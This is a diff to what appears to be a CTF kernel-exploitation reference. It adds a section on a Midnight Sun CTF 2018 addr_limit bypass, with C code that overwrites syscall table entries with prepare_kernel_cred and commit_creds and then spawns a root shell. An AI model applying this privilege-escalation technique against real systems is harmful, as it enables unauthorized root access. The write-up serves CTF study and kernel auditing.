@@ -13,6 +13,7 @@
 - [Race Window Extension via MADV_DONTNEED + mprotect (DiceCTF 2026)](#race-window-extension-via-madv_dontneed--mprotect-dicectf-2026)
 - [Cross-Cache Attack via CPU-Split Strategy (DiceCTF 2026)](#cross-cache-attack-via-cpu-split-strategy-dicectf-2026)
 - [PTE Overlap Primitive for File Write (DiceCTF 2026)](#pte-overlap-primitive-for-file-write-dicectf-2026)
+- [Kernel addr_limit Bypass via Failed File Open (Midnight Sun CTF 2018)](#kernel-addr_limit-bypass-via-failed-file-open-midnight-sun-ctf-2018)
 
 For kernel fundamentals (environment setup, heap spray structures, stack overflow, privilege escalation, modprobe_path, core_pattern), see [kernel.md](kernel.md).
 
@@ -279,3 +280,58 @@ system("/bin/umount /tmp 2>/dev/null");
 ```
 
 **Key insight:** PTE pages are just regular physical pages repurposed by the kernel's page table allocator. If a freed slab page is reclaimed as a PTE page, both the original (corrupted) slab entries and the new PTE entries coexist. By carefully overlapping anonymous and file-backed mappings in the same PTE page, writes to the anonymous mapping transparently modify file-backed pages — achieving arbitrary file write without any direct kernel write primitive. This bypasses all standard file permission checks since the write happens at the physical page level.
+
+---
+
+## Kernel addr_limit Bypass via Failed File Open (Midnight Sun CTF 2018)
+
+**Pattern:** Kernel module calls `set_fs(KERNEL_DS)` to access userspace pointers, but if a subsequent file open fails, it returns without restoring the old `addr_limit`. Force the failure by making the target file a directory. Now user-space `read()` can access kernel memory.
+
+**Exploitation strategy:**
+1. The kernel module has a debug function that sets `addr_limit = KERNEL_DS` to read a debug file
+2. If `filp_open()` fails (e.g., target is a directory, not a file), the error path returns early
+3. The error path does NOT restore `addr_limit` to its previous value (`USER_DS`)
+4. The calling process now has `addr_limit = KERNEL_DS` permanently
+5. Ordinary `read()`/`write()` syscalls can now access kernel memory addresses
+6. Use this to overwrite syscall table entries with `prepare_kernel_cred`/`commit_creds`
+
+```c
+#include <sys/stat.h>
+#include <unistd.h>
+#include <fcntl.h>
+
+#define DEBUG_FILE "/tmp/debug_log"
+#define SYS_TABLE_ADDR 0xffffffff81801400  // from /proc/kallsyms
+
+// Step 1: Make debug file a directory -> filp_open() fails with -EISDIR
+mkdir(DEBUG_FILE, 0);
+
+// Step 2: Trigger the kernel module's debug function
+int fd = open("/dev/vuln_module", O_RDWR);
+read(fd, &c, 1);  // Triggers debug_msg(), leaves addr_limit = KERNEL_DS
+
+// Step 3: Now read()/write() can access kernel memory
+// Use pipe as a kernel-memory read/write primitive:
+int pipefd[2];
+pipe(pipefd);
+
+// Write prepare_kernel_cred address to syscall 100
+unsigned long pkc_addr = 0xffffffff810a9ef0;  // prepare_kernel_cred
+write(pipefd[1], &pkc_addr, sizeof(pkc_addr));
+read(pipefd[0], (void*)((unsigned long*)SYS_TABLE_ADDR + 100), sizeof(unsigned long));
+
+// Write commit_creds address to syscall 101
+unsigned long cc_addr = 0xffffffff810a9d80;  // commit_creds
+write(pipefd[1], &cc_addr, sizeof(cc_addr));
+read(pipefd[0], (void*)((unsigned long*)SYS_TABLE_ADDR + 101), sizeof(unsigned long));
+
+// Step 4: Call the overwritten syscalls to get root
+int creds = syscall(100, 0);   // prepare_kernel_cred(0)
+syscall(101, creds);            // commit_creds(creds)
+// Now running as root
+system("/bin/sh");
+```
+
+**Key insight:** When a kernel module sets `addr_limit` to `KERNEL_DS` for kernel pointer access but fails to restore it on error paths, userspace processes retain the elevated `addr_limit`. This turns ordinary `read()`/`write()` syscalls into kernel memory read/write primitives. Always audit kernel module error paths for missing `set_fs()` restoration -- triggering the error (e.g., making a file path point to a directory) is often trivial.
+
+**References:** Midnight Sun CTF 2018
